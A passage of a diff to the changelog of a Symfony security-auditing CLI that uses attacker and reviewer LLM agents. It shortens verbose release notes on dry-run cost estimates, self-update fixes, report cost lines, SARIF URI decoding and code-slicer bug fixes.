+- A failed standalone command echoes `Command: symfony-security-auditor <args>` under the rendered error, even with `-q`, so a pasted CI log shows the invocation that failed ([#348](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/348))
+- The `--dry-run` cache-discount caveat is a dimmed footnote instead of a framed `[NOTE]` block ([#348](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/348))
 
-- **The standalone binary now shows its identity banner on every command, not
-  only `audit`.** `AuditPresenter::header()` was its sole caller
-  (`src/Command/AuditCommand.php`), so `symfony-security-auditor --version`,
-  `-h`, `doctor`, `init` and `self-update --check` all opened with nothing
-  saying which binary was talking. The wordmark moved into a dedicated
-  `ConsoleBanner` (`src/Command/ConsoleBanner.php`) behind a
-  `ConsoleBannerInterface` port, and `StandaloneApplication::doRun()` renders it
-  before delegating to the base application — `--version` returns before any
-  command is resolved, so a `ConsoleEvents` listener could never have covered
-  it. It is written to stderr, so `--version` piped into a version check and
-  `list --format=json` keep a clean stdout.
+### Bugfixes 🐛
 
-  Exactly one collaborator prints it per run, with no command-name special case:
-  `StandaloneContainerFactory` wires the audit command's own banner to
-  `NullConsoleBanner`, because in the binary the application has already printed
-  one by the time that command is even resolved. A bundle install is unchanged —
-  there `ConsoleBannerInterface` resolves to the real banner and `audit` prints
-  it itself, while the host application's own commands print nothing. The two
-  completion commands stay bare on every stream: `_complete` runs on every TAB
-  press and `completion` emits a script the shell evaluates.
-
-- **`--dry-run` no longer needs a provider credential in the standalone
-  binary.** `symfony-security-auditor audit <path> --dry-run` aborted before it
-  scanned a single file:
-
-  ```text
-  The environment variable "ANTHROPIC_API_KEY", referenced by your config, is not set.
-  ```
-
-  A dry run estimates cost from the scanned files and never reaches the
-  provider, so pricing a project should not have meant signing up for an API key
-  first. `StandalonePlatformConfigResolver::resolve()`
-  (`src/Audit/Infrastructure/Config/`) now takes a `$credentialsRequired` flag;
-  when it is off, an unresolved `%env(...)%` placeholder in the `platform` block
-  yields `UNNEEDED_CREDENTIAL` instead of throwing — a deliberately unusable
-  stand-in, so a code path that somehow reached the provider with it would be
-  rejected rather than billed to someone. `StandaloneApplication` reads
-  `--dry-run` off the raw invocation and answers `needsProviderCredentials()`
-  for the lazily-built audit command, because the failure it prevents happens
-  while that command is still being constructed. A real run is unchanged and
-  still refuses to start, as does `doctor`, whose whole job is to report the
-  missing key.
-
-- **The identity banner now carries the project homepage.** A third line under
-  the wordmark prints
-  `https://github.com/vinceAmstoutz/symfony-security-auditor` in grey, aligned
-  with the tagline, so a screenshot or a CI log carries a way back to the
-  project. Both lines share one `ConsoleBanner::alignedUnderWordmark()` helper,
-  so they track the scan mark's width together.
-
-- **A failed command now echoes the command line under the rendered error.**
-  Symfony's error block names the exception and the file but never the
-  invocation, which is the piece missing from a pasted CI log or bug report.
-  `StandaloneApplication::renderThrowable()`
-  (`src/Standalone/StandaloneApplication.php`) prints
-  `Command: symfony-security-auditor <args>` after the block, at
-  `VERBOSITY_QUIET` so `-q` keeps it, and run through
-  `OutputFormatter::escape()` so a path containing console markup cannot smuggle
-  styling into the output. Only a real command line is echoed — a programmatic
-  `ArrayInput` has no invocation to reproduce.
-
-- **The `--dry-run` caveat is a dimmed footnote instead of a framed `[NOTE]`
-  block.** `AuditPresenter::dryRunResult()` (`src/Command/AuditPresenter.php`)
-  used `SymfonyStyle::note()`, which frames the text full-width and runs a `!`
-  gutter down every wrapped line — weight that belongs to something the reader
-  must act on, not to a footnote about cache discounts. It now prints through
-  the same `caveat()` helper as the reviewer-ratio note beside it, so the two
-  read as one voice.
+- `audit --dry-run`: no longer needs a provider credential in the standalone binary, so a project can be priced before signing up for an API key; a real run and `doctor` still report a missing key ([#348](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/348))
 
 ## [1.20.0] — 2026-08-22 — Ledger
 
-A release about knowing the real cost before you pay it, and trusting the binary
-that pays it on your behalf. `--dry-run` now accounts for skill-prompt overhead,
-tool round-trip overhead, and PoC/fix synthesis — the gaps that made prior
-estimates undercount real spend — and reports the reviewer ratio as the rough
-heuristic it is rather than a peer figure. `self-update` now refreshes the
-bundled pricing catalog after replacing the binary and hardens the
-download-verify-swap sequence against corruption. SARIF artifact URIs are now
-percent-decoded correctly, and two more secret-scrubbing gaps (Basic-auth
-headers, Slack `xapp-` tokens) are closed.
+### New Features ✨
 
-### Added
+- `--dry-run` counts the attacker's skill-prompt overhead on every chunk and iteration, which `audit.stable_system_prompt` (default `true`) makes sizeable, so estimates no longer undercount real spend ([#336](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/336), [#345](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/345))
+- `--dry-run` counts tool round-trip overhead when `audit.tools_enabled` is on, scaled by `audit.max_tool_iterations`, so lowering that option lowers the estimate ([#337](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/337), [#345](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/345))
+- `--dry-run` warns on stderr when `audit.poc_synthesis.enabled` or `audit.fix_synthesis.enabled` is on, since neither stage's cost is part of the estimate ([#338](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/338))
+- `--dry-run` presents the reviewer figure as a rough floor, stating the ratio to attacker input it works out to and that real cost scales with the findings found ([#339](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/339))
+- `self-update` refreshes the pricing catalog after replacing the binary, so a long-lived install picks up new models and prices; it also refreshes when the binary is already current, `--check` never does, and it is skipped under `privacy.offline_only` ([#335](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/335))
+- A failed pricing refresh never fails `self-update`: it warns that cost figures keep using the catalog already in place and that re-running `self-update` retries ([#335](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/335))
+- `doctor` and `--version` show which `symfony/models-dev` pricing snapshot the binary prices from, naming the refreshed file when one is in use ([#334](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/334))
+- A run with zero findings shows a one-line `review skipped` acknowledgment instead of jumping from the last chunk to the report, with its own wording when every finding was baseline-accepted or the run is aborting ([#333](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/333))
+- The console, Markdown and HTML reports show a `Cost` line labeled "published rates", or "no published pricing, or a self-hosted model" when tokens were spent on a model without a published rate, judged per model ([#332](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/332))
+- `--format=json` reports gain a `by_model` cost object next to `by_role`, with `cache_read_tokens` and `cache_creation_tokens` per model ([#332](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/332))
+- The CLI header is a branded `◉ >> SECURITY AUDITOR` wordmark with a tagline, laid out the same in CI logs and dropping the `◉` when the locale is not UTF-8 ([#331](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/331))
+- `--show-scanned` labels the catch-all buckets `php · uncategorized` and `other · uncategorized` and lists them last; the `included_types` and `excluded_types` values are unchanged ([#330](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/330))
+- `--show-scanned` and `--dry-run` close with one light confirmation line instead of a boxed `[OK]` block ([#329](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/329))
+- `init` prints a copy-pasteable `export ANTHROPIC_API_KEY=` line instead of naming the variable in prose ([#328](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/328))
+- Secret scrubbing redacts `Authorization: Basic` credentials, keeping the header and scheme (`Authorization: Basic ***REDACTED:basic_authorization***`), and Slack `xapp-` app-level tokens ([#343](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/343))
 
-- **`--dry-run` now caveats the reviewer figure as a flat, pre-run heuristic.**
-  `EstimateAuditCostUseCase::DEFAULT_REVIEWER_INPUT_RATIO` derives the reviewer
-  estimate as a fixed fraction of attacker input alone — there are no findings
-  yet for a dry run to count, so it can't reflect a project's real vulnerability
-  density or the code context each finding pulls in.
-  `AuditPresenter::dryRunResult()` now prints a note stating the actual ratio
-  and that actual cost scales with real findings, so it reads as a rough floor
-  rather than a peer to the attacker figure. The percentage is derived from the
-  reviewer/attacker token counts in the cost breakdown itself
-  (`AuditPresenter::reviewerRatioPercent()`) rather than restated as a fixed
-  string, so it stays correct if the ratio the use case was constructed with
-  ever differs from the default. The note is worded as what this estimate works
-  out to rather than as the configured assumption, because the two need not
-  agree: once the attacker figure carries prompt overhead the reviewer never
-  sends, the derived percentage drops below `reviewer_input_ratio` while
-  remaining an accurate description of the printed breakdown. The note also
-  moved out of the `SymfonyStyle::listing()` block it previously shared with the
-  cost breakdown — every `listing()` element gets its own bullet and no
-  word-wrap, so a caveat that size picked up a stray leading bullet and wrapped
-  ragged on narrower terminals; it now prints as its own properly-wrapped line.
+### Bugfixes 🐛
 
-  When the breakdown carries no attacker input to measure against — no attacker
-  entry, or zero attacker input tokens — the caveat is omitted entirely rather
-  than printing "assumes ~0% of attacker input", which stated a ratio against
-  nothing. Both role lookups are read the same way, so a breakdown missing
-  either entry is handled identically.
+- `scan.import_sarif`: results whose file path a URI has to escape (a space as `%20`) were silently dropped, including the auditor's own SARIF; artifact URIs are now percent-decoded before matching ([#344](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/344))
+- `scan.code_slicing`: the configuration reference no longer promises whole method bodies; it states that retention is per line and that a file should go unsliced when the taint flow between source and sink matters ([#343](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/343))
+- The pipeline line in the CLI header uses `->` and `vs` instead of two characters a Windows console cannot show ([#331](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/331))
+- `self-update`: an unreadable download now fails with a clear message instead of a `TypeError`, and the downloaded temp file is removed on any failure ([#340](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/340))
+- `self-update`: no longer reports a stale "update available" notice for up to a day after a successful update ([#340](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/340))
+- `self-update`: no longer ends in a phar corruption fatal error after a successful update, because the binary swap now happens at process exit ([#341](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/341))
+- `self-update --check`: the passive update notice now agrees with the version `--check` just reported instead of staying silent for up to a day ([#341](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/341))
+- `RegexCodeSlicer`: a heredoc body line that merely starts with the closing identifier no longer ends the heredoc early, which could elide a real SQL injection sink from the attacker ([#345](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/345))
+- A fully positional `#[Route(...)]` attribute keeps its `methods` restriction instead of reporting none ([#345](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/345))
 
-- **`--dry-run` now warns when PoC or fix synthesis is enabled**, since neither
-  stage's cost was ever included in the estimate. `PoCSynthesizer` and
-  `FixSynthesizer` each make their own LLM call per qualifying finding — a cost
-  that can't be known before the attacker has actually run and found something —
-  so `EstimateAuditCostUseCase`'s cost breakdown has no line item for either.
-  `AuditPresenter::synthesisCostWarnings()` prints a stderr warning naming the
-  enabled stage(s) (`audit.poc_synthesis.enabled` /
-  `audit.fix_synthesis.enabled`) whenever `--dry-run` runs with one on,
-  mirroring the existing unpriced-model warning precedent. The `thorough`
-  profile turns PoC synthesis on by default, making it the case most likely to
-  hit this gap. When both stages are enabled together, a single warning names
-  both instead of printing two near-identical full-width blocks back to back.
-- **`--dry-run` now counts the attacker's skill-prompt overhead**, closing a gap
-  where the estimate undercounted real spend by a fixed amount repeated on every
-  chunk and every iteration. `audit.stable_system_prompt` (default `true`) makes
-  the attacker send every built-in skill block — currently 25 of them, ~66KB of
-  prompt — on every chunk regardless of relevance, and none of that reached the
-  estimate. `EstimateAuditCostUseCase::execute()` now chunks the scanned files
-  the same way a real run does (via `FileChunker`) and, for each chunk, renders
-  its own skill prompt through the new `AttackerSkillPromptRendererInterface`
-  port (implemented by `AttackerSkillRegistry`) and estimates its tokens, adding
-  the sum to the attacker's per-round input before scaling by `max_iterations`.
-  Rendering per chunk — rather than once from the whole project's file-type
-  union and multiplying by the chunk count — keeps the estimate accurate when
-  `stable_system_prompt` is `false`: each chunk then only pulls in the skills
-  matching its own files, the same filtering
-  `AttackerPromptBuilder::skillsForFiles()` applies on a real run.
-- **`--dry-run` now also counts tool round-trip overhead.** With
-  `audit.tools_enabled` (default `true`), the attacker can take several
-  tool-call rounds per chunk, each resending the growing conversation plus the
-  tool schemas — none of which the estimate previously modeled. A new
-  `EstimateAuditCostUseCase::DEFAULT_TOOL_ROUND_TRIP_RATIO` (50%) inflates the
-  per-round attacker input whenever `tools_enabled` is on, before scaling by
-  `max_iterations`, following the same calibrated-ratio pattern as
-  `DEFAULT_OUTPUT_RATIO`. The ratio is scaled by `audit.max_tool_iterations`,
-  the option that actually bounds how many tool rounds a chunk may take, against
-  the `CALIBRATION_MAX_TOOL_ITERATIONS` bound the 50% was measured at: halving
-  the bound to 4 charges 25% instead of 50%, and raising it to 16 charges 100%.
-  Lowering `max_tool_iterations` to cut cost is now reflected in the estimate
-  rather than ignored by it.
+### Core 🧱
 
-  The reviewer estimate deliberately stays out of this. `reviewerInputRatio` is
-  applied to the file-content sum alone, not to the attacker total, because the
-  reviewer prompt carries no skill blocks — `ReviewerPromptBuilder` and
-  everything under `Infrastructure/Prompt/Reviewer/` reference none. Deriving it
-  from the attacker total instead would bill the reviewer for an overhead it
-  never sends.
-
-- **`self-update` now refreshes the bundled pricing catalog after replacing the
-  binary**, so a long-lived install picks up newly-added models and price
-  changes without waiting for the next binary release. `SelfUpdater::run()`
-  calls a new `PricingCatalogRefresherInterface` port after `replaceBinary()`
-  succeeds; `ModelsDevCatalogRefresher` (`src/Audit/Infrastructure/SelfUpdate/`)
-  downloads `models-dev.json` into the XDG cache directory, and
-  `ModelsDevPricingProvider` now reads from that same cache location by default
-  (`config/services.php` wires `%kernel.cache_dir%/models-dev.json`) instead of
-  only the version bundled at build time. The download lands in a temp file and
-  is only moved into place once it has been confirmed both to decode as a JSON
-  object and to carry at least one priced model, so neither a truncated transfer
-  nor an unrelated document served in its place can leave a corrupt catalog
-  behind — the previous good file (or the one frozen into the binary) stays put.
-  The catalog URL tracks upstream `main` deliberately: pinning it to a tag would
-  freeze the catalog at exactly the staleness a new binary release already
-  fixes, so the shape check above is what guards the install. The refresh never
-  throws — a failed download, an unwritable cache directory or an unrecognized
-  payload returns `PricingCatalogRefreshOutcome::Failed`, and `self-update` now
-  says so instead of failing silently, warning that cost figures keep using the
-  catalog already in place — the last successful refresh if there was one,
-  otherwise the one frozen into the binary at build time — and that re-running
-  `self-update` retries it, which it now can: the refresh no longer rides only
-  on a binary replacement, so a binary already on the latest version still
-  refreshes a catalog that has drifted since its build. A `--check` probe never
-  does, so the background update notifier stays side-effect-free. It is skipped
-  entirely when `privacy.offline_only` is set or the XDG config path can't be
-  resolved (`StandaloneApplicationFactory::pricingCatalogRefresher()`), and the
-  `privacy.offline_only` lookup now goes through
-  `StandaloneConfig::offlineOnlyIn()` so the key path lives in one place rather
-  than being re-read by hand.
-- **`doctor` and `--version` now surface which `symfony/models-dev` pricing
-  snapshot is bundled.** A standalone install's cost figures (`--dry-run`, the
-  report's `Cost` line) come from whatever `symfony/models-dev` catalog was
-  newest on Packagist when that release's binary was built, with no way to see
-  which snapshot that is. `EnvironmentDoctor::diagnose()`
-  (`src/Command/EnvironmentDoctor.php`) gains a "Pricing catalog" check
-  reporting the installed version (`Composer\InstalledVersions`) and the
-  resolved catalog file, canonicalized through
-  `Symfony\Component\Filesystem\Path` — `InstalledVersions::getInstallPath()`
-  answers relative to the Composer directory, so the raw path printed a
-  `vendor/composer/../symfony/models-dev/…` detour at the user, and `realpath()`
-  cannot collapse it because it returns `false` for the `phar://` path a
-  packaged binary reports. The standalone binary's `--version` output now
-  appends it too, via a new `StandaloneApplication`
-  (`src/Standalone/StandaloneApplication.php`) overriding `getLongVersion()` —
-  the bare `Symfony\Component\Console\Application` used by
-  `StandaloneApplicationFactory` had no other extension point for this. The
-  `'symfony/models-dev'` package name now lives in one place,
-  `ModelsDevPricingProvider::CATALOG_PACKAGE` (made `public`);
-  `EnvironmentDoctor` and `StandaloneApplicationFactory` reference it instead of
-  each restating their own copy of the string. The check names the catalog
-  **file** it resolved, not just the packaged version, so it can never report a
-  snapshot the run is not actually pricing from once `self-update` starts
-  writing a refreshed catalog into the XDG cache directory — a new
-  `ModelsDevPricingProvider::effectiveCatalogPath()` is the single resolution
-  point both `loadCatalog()` and the check go through. An override path that
-  does not exist yet falls through to the packaged catalog instead of shadowing
-  it, so pointing the check at the refresh location before anything writes there
-  is safe. When neither an override nor a packaged catalog is readable, the
-  check warns as before.
-
-  The version and the path are reported together only when they describe the
-  same file. `InstalledVersions::getPrettyVersion()` describes the packaged
-  catalog and nothing else, so when the resolved path is a refreshed override —
-  whose contents came from upstream `main` at refresh time — the check names the
-  override and says the bundled package is unused, rather than stamping a
-  version onto a file that does not have it.
-  `ModelsDevPricingProvider::packagedCatalogPath()` (the former private
-  `defaultCatalogPath()`, now `public`) is what the check compares against.
-
-- **A clean run (zero findings) no longer leaves the reviewer step looking like
-  it silently disappeared.** `ConsoleProgressReporter::onReviewStarted()` (and
-  its `PlainProgressReporter` counterpart) only ever fired when the attacker
-  recorded at least one finding, so a run with nothing to report jumped straight
-  from the last chunk to the final report with no acknowledgment that reviewing
-  had nothing to do. `AuditOrchestrator` now reports a new `review.skipped`
-  progress event (`src/Audit/Domain/Model/ProgressEvent.php`) from all three
-  places it can skip the reviewer pass — the attacker finding nothing, every
-  remaining finding already being baseline-accepted, and the mid-run abort
-  recovery path finding nothing left to review — which both progress reporters
-  render as a lightweight one-line acknowledgment. The earlier wording ("no
-  findings to review") read as though the whole audit came up empty even on
-  iteration 2+, after findings had already streamed past.
-
-  Each site carries its own `reason` in the event context, because only the
-  first of the three is actually "no new findings": the second means every
-  finding _was_ found and then baseline-accepted, and the third fires as a run
-  is aborting, where a reassuring line would print immediately before the
-  failure. The reporters render "every finding was baseline-accepted — review
-  skipped" and "nothing left to review after the abort" respectively. Each of
-  the three reasons is matched explicitly, and a reason the reporters do not
-  recognise falls back to a bare "review skipped" rather than borrowing the "no
-  new findings" wording: a fourth reason added later would otherwise be
-  announced as the wrong cause, which is worse than naming none.
-
-- **The console, Markdown, and HTML reports now show the audit's real cost, not
-  just token counts.** `RunAuditUseCase::buildCost()` already assembled an
-  `AuditCost` from the LLM provider's own per-call token usage, but
-  `ConsoleReportRenderer`, `MarkdownReportRenderer`, and `HtmlReportRenderer`
-  (`src/Audit/Infrastructure/Report/`) only ever rendered
-  `inputTokens()`/`outputTokens()`/`primaryModel()` — `estimatedCostUsd()` was
-  computed but never shown outside `--format=json`/`--format=sarif` or
-  `--dry-run`. All three renderers now show a `Cost` line labeled "published
-  rates" — the token counts are the provider's exact figures, but the USD
-  conversion comes from `symfony/models-dev`'s published pricing snapshot, which
-  can drift from a negotiated rate or an unpriced model. When tokens were
-  actually spent but the model has no published rate (a self-hosted or unlisted
-  model), the new `AuditCost::hasPublishedPricing()` flips the label to "no
-  published pricing, or a self-hosted model" instead of showing `$0.0000` as if
-  it were a genuinely free run — the same caveat `--dry-run` already gives via
-  `AuditPresenter::unsupportedModelWarnings()`.
-
-  The label is decided per model, not from the aggregate. A split
-  attacker/reviewer setup pairing a priced cloud attacker with an unpriced local
-  reviewer sums to a nonzero total, so the aggregate alone would report
-  "published rates" for a run that is half unpriced — the case this feature
-  exists to catch. `BudgetTracker` already prices every call at that call's own
-  model, so it now accumulates per-model totals alongside the running cost and
-  `RunAuditUseCase` attaches them to the `AuditCost` via the new
-  `AuditCost::withUsageByModel()`. `hasPublishedPricing()` checks whichever
-  breakdown it has — per model for a real run, per role for `--dry-run` — and
-  falls back to the aggregate only when there is none, which is correct on its
-  own terms because a single-model run has nothing to disaggregate.
-
-  Per-model rather than per-role because that is what a real run can honestly
-  attribute: it records the model of every call but not the agent that made it,
-  and it also covers models neither role owns — `EscalatingAttackerAgent`'s
-  cheap first pass, PoC and fix synthesis. The JSON report gains a `by_model`
-  object alongside the existing `by_role`; both are additive, and
-  `AuditCost::of()` is unchanged, so existing callers are unaffected. Each
-  `by_model` entry also carries `cache_read_tokens` and `cache_creation_tokens`,
-  because `CostCalculator::costForCall()` bills cached prompt traffic: without
-  them a cached run reported a cost its own token counts could not account for.
-  `AuditCost::hasPublishedPricing()` counts that traffic as spend too, so a
-  model whose whole run arrived from the prompt cache and priced to zero is
-  still reported as a pricing gap instead of passing as free. Both keys are
-  optional in the accepted shape, keeping `withUsageByModel()` callers valid.
-
-- **The CLI header now carries the project's identity, and renders the same way
-  everywhere.** `AuditPresenter::header()` (`src/Command/AuditPresenter.php`)
-  printed `$symfonyStyle->title('Symfony LLM Security Auditor')` — a plain
-  underlined line with no visual identity. It now prints `◉ >> SECURITY AUDITOR`
-  with the mark and `SECURITY` in the logo's pink (`#e71c55`) and `AUDITOR` in
-  its navy (`#5b6fd6`), over a `Symfony - multi-agent LLM audit` tagline whose
-  indent is derived from the lead string rather than hardcoded, so it always
-  starts under the wordmark.
-
-  Colour is the only thing that varies by terminal. A single `writeln()`
-  produces every state, because `OutputFormatter` strips the style tags when the
-  output is not decorated — so a CI log shows the identical layout rather than a
-  different header, instead of the previous `title()` fallback.
-
-  `◉` (U+25C9) is outside CP437, CP850 and CP1252, so a console left on a legacy
-  code page would substitute it. `AuditPresenter::scanMark()` drops the mark
-  unless `LC_ALL`, `LC_CTYPE` or `LANG` announces UTF-8, leaving the coloured
-  wordmark, which carries the identity on its own. A Windows console sets none
-  of those unless the shell is UTF-8 aware, so it lands on the ASCII wordmark.
-  Every other character in the header is ASCII.
-
-### Changed
-
-- **`--show-scanned`'s generic `php` and `other` buckets no longer read as
-  "every PHP file"/"every other file."** `AuditPresenter::scannedFiles()`
-  (`src/Command/AuditPresenter.php`) printed the fallback `ProjectFileType::PHP`
-  and `::OTHER` buckets — the catch-all for files matching no specific archetype
-  — as plain `php (N)`/`other (N)` siblings of
-  `entity`/`voter`/`event_subscriber`/etc., with nothing marking them as the
-  leftover buckets they are. Both are now labeled `php · uncategorized`/
-  `other · uncategorized` and always render last, after every specific
-  archetype. Presentation only — the underlying `ProjectFileType` backed values
-  (`'php'`/`'other'`, used by `included_types`/`excluded_types` config) are
-  unchanged.
-- **`--show-scanned` and `--dry-run` no longer close with a heavy `[OK]` block
-  for an intermediate confirmation.** `AuditPresenter::scannedFiles()` and
-  `AuditPresenter::dryRunResult()` (`src/Command/AuditPresenter.php`) used
-  `SymfonyStyle::success()` for the files-in-scope count and the
-  dry-run-complete message, so `--show-scanned --dry-run` printed two `[OK]`
-  boxes and a `[NOTE]` block within a few lines. Both now go through a shared
-  `lightConfirmation()` helper printing a single light line, matching the style
-  the console report already uses for its own success line — the boxed block is
-  reserved for a command's true final pass/fail outcome
-  (`AuditPresenter::result()`). The `✅` marker is gated on `isDecorated()`, so
-  a redirected or CI log gets the plain text without it, matching the pattern
-  the branded identity banner already uses; and the line keeps the trailing
-  blank line `success()` used to add, so it doesn't abut whatever prints next.
-- **`init`'s success message now prints a copy-pasteable `export` line instead
-  of naming the variable in prose.** `InitCommand::__invoke()`
-  (`src/Command/InitCommand.php`) used to say
-  `Export ANTHROPIC_API_KEY, then run "audit <path>".`, leaving the user to know
-  their shell's export syntax and retype the variable name. It now prints
-  `Run: export ANTHROPIC_API_KEY=, then "audit <path>".`, a line that can be
-  pasted as-is.
-
-### Fixed
-
-- **`scan.import_sarif` silently dropped every result whose file path a URI has
-  to escape.** `SarifImportingPreScanner::normalizeUri()`
-  (`src/Audit/Infrastructure/Scan/SarifImportingPreScanner.php`) compared the
-  raw `artifactLocation.uri` against the scanned paths, but SARIF 2.1.0 spells
-  that field as an RFC 3986 URI reference — so a producer reports
-  `templates/my page.html.twig` as `templates/my%20page.html.twig`, which
-  matched no scanned file and was discarded with no warning. This project's own
-  `SarifReportRenderer::encodeArtifactUri()` percent-encodes on the way out, so
-  the auditor could not even re-import its own SARIF. A `codeFlows` taint-path
-  step hit it worse: an encoded step collapsed to the `...` placeholder that
-  documents a file outside the scan surface, so an in-scope taint source was
-  reported as unknown. The URI is now percent-decoded before the project-root
-  prefix is stripped — that prefix is a raw filesystem path and may itself
-  contain a space. `rawurldecode()` leaves an invalid escape sequence untouched,
-  so a producer that emits unescaped paths keeps matching.
-- **`docs/architecture.md`'s command reference no longer contradicts
-  `docs/configuration.md`.** Its exit-code summary read "`0`
-  (SAFE/LOW/MEDIUM/HIGH), `1` (CRITICAL risk or invalid path or unexpected
-  failure), `2` (budget exceeded)", which predates three behaviours the
-  canonical table in `docs/configuration.md` already documents: `audit.fail_on`
-  is configurable, so HIGH exits `1` whenever it is set below `critical`; a scan
-  that discovers no file at all exits `1`; a score below `--min-score` exits
-  `1`; and `2` also covers a run that never started because an unpriced model
-  makes `audit.budget.max_cost_usd` unenforceable. The same table listed three
-  `--format` values when `OutputFormat` has nine. Both rows are corrected and
-  the exit-code paragraph now points at the canonical table rather than
-  restating it.
-- **`scan.code_slicing`'s configuration reference no longer promises whole
-  method bodies.** The `info()` text — what
-  `config:dump-reference symfony_security_auditor` prints — said the slicer
-  keeps "the FULL body of methods that touch security-relevant tokens".
-  `RegexCodeSlicer` retains per line, not per method, which
-  `test_inert_body_lines_are_elided()` pins deliberately: on a textbook
-  vulnerable controller the source (`$name = $request->request->get('name')`)
-  and the sink (`$this->conn->executeStatement($sql)`) are both kept while the
-  `$sql` concatenation between them is elided, so the slice shows `$sql` used
-  but never assigned, and a reflected-XSS built the same way disappears
-  entirely. The text now states that retention is per line, that an inert line
-  inside a matched method is still elided, and that a file should go unsliced
-  when the taint flow between source and sink matters more than the tokens.
-  Behaviour is unchanged; only the description was wrong. `code_slicing` follows
-  the active profile when unset, so this is the documented default on `fast`.
-- **The pipeline line printed two characters a Windows console cannot show.**
-  `AuditPresenter::header()` emitted
-  `Pipeline: Ingestion → Mapping → Audit (Attacker ⚔ Reviewer)`. `→` (U+2192)
-  and `⚔` (U+2694) are both outside CP437/CP850/CP1252, and `⚔` is frequently
-  rendered double-width, which shifts every column after it. The line now reads
-  `Pipeline: Ingestion -> Mapping -> Audit (Attacker vs Reviewer)`.
-- **`self-update` could corrupt the installed binary and leave no readable error
-  behind.** `SelfUpdater::assertChecksumMatches()`
-  (`src/Audit/Infrastructure/SelfUpdate/SelfUpdater.php`) guarded a failed
-  `hash_file()` call with `\assert(false !== $actual)` — a no-op in production,
-  since `zend.assertions` is off by default, so an unreadable download fell
-  through to `hash_equals()` with a `bool` instead of a `string`: an uncaught
-  `TypeError` instead of an actionable message. It now checks readability
-  explicitly and throws `SelfUpdateFailedException::forUnreadableDownload()`.
-  `SelfUpdater::replaceBinary()` also now cleans up the downloaded temp file on
-  any failure — previously only on `SelfUpdateFailedException` — via a `finally`
-  block instead of a narrow `catch`, so the original binary is left untouched
-  regardless of which step failed.
-- **`self-update` could report a stale "update available" notice for up to a day
-  after actually updating.** `ThrottledUpdateAvailabilityNotifier` caches the
-  latest-version check for 24h (`DEFAULT_THROTTLE_SECONDS`), but nothing cleared
-  that cache when `self-update` itself succeeded, so a cached "a newer version
-  is available" answer could outlive the update that installed it.
-  `UpdateCheckStoreInterface` gained a `clear()` method, and `SelfUpdateCommand`
-  now calls it after a successful (non-`--check`) update.
-- **`self-update` ended in a phar corruption fatal error even though the update
-  had succeeded.** The standalone binary is a GZ-compressed PHAR whose classes
-  load lazily, by path, for as long as the process lives.
-  `SelfUpdater::install()` renamed the new binary over that path mid-run, so the
-  next autoload read the new archive at the old archive's offsets and PHP
-  aborted with `zlib: data error` followed by
-  `internal corruption of phar "..." (actual filesize mismatch on file "...")`.
-  Rendering the success message is itself the first thing to need a not-yet-
-  loaded class (`Symfony\Component\Console\Helper\OutputWrapper`), so the run
-  died before printing anything and the failure then cascaded into
-  `ConsoleErrorEvent` — leaving a correctly updated binary on disk behind a
-  fatal error that read like a corrupted install. The move is now deferred:
-  `SelfUpdater` schedules it through the new `BinarySwapSchedulerInterface`, and
-  the standalone entry point (`bin/symfony-security-auditor`) drains the
-  `PendingBinarySwap` from a shutdown function, past the last autoload. Failure
-  handling is unchanged in substance — the download is still verified before
-  anything is moved, and the temp file is still discarded on any failure — but a
-  `chmod` failure is now reported during the run while a failed move surfaces as
-  the process exits.
-- **`self-update --check` left the passive update notice contradicting what it
-  had just reported.** `--check` always reaches the release feed, but discarded
-  the answer, while the after-command notice serves a 24h-throttled cache
-  (`ThrottledUpdateAvailabilityNotifier`). A cache entry written before a
-  release shipped therefore kept the notice silent for up to a day after
-  `--check` had already shown the user the newer version. `SelfUpdateCommand`
-  now records the version it observed, so the notice agrees from the next
-  command onwards.
-- **`RegexCodeSlicer` could silently elide genuinely security-relevant code
-  after a heredoc whose body contains a line starting with the closing
-  identifier word.** `HeredocLineTracker::closeTrailer()`
-  (`src/Audit/Infrastructure/Scan/HeredocLineTracker.php`) matched any line
-  starting with the identifier as the close, with no constraint on what followed
-  it — so a body line like `SQL syntax note: uses index` inside a `<<<SQL` block
-  ended heredoc tracking two lines early. Every line after that false close
-  (including the actual tainted interpolation, e.g. `WHERE name = '$name'`) then
-  went through ordinary per-line elision instead of being retained verbatim,
-  replacing it with `// elided` whenever it didn't independently match a known
-  security token — hiding a real SQL-injection sink from the attacker LLM. The
-  trailer is now restricted to whitespace and the punctuation PHP actually
-  allows after a closing identifier (`;`, `,`, `)`, `]`), so a body line
-  followed by anything else is no longer mistaken for the close.
-- **A fully positional `#[Route(...)]` attribute silently dropped its `methods`
-  restriction.** `RouteAttributeParser::resolveRouteArgName()`
-  (`src/Audit/Infrastructure/Scan/RouteAttributeParser.php`) only mapped unnamed
-  arguments at position 0 (`path`) and 1 (`name`) — matching Symfony's own
-  `Route::__construct()` order for those two, but not for `methods`, which sits
-  at position 6. A controller action declaring
-  `#[Route('/admin/x', null, [], [], [], '', ['DELETE'])]` — valid, real-world
-  positional syntax — reported `routeMethods()` as `[]` instead of `['DELETE']`,
